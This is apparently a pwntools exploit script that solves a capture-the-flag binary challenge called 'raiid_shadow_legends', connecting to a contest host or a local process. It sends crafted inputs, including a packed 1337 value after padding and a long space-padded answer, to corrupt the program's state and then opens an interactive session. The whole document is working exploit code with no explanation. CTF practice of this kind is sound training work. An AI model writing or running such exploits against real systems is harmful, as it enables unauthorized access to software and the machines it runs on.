from pwn import *

e = ELF("./raiid_shadow_legends")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("shell.actf.co", 21300)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter("?", "1")
p.sendlineafter("?", "AAAA" + p64(1337))
p.sendlineafter("?", "yes" + " " * 0x50)

p.sendlineafter(":", "A")
p.sendlineafter("?", "2")


p.interactive()
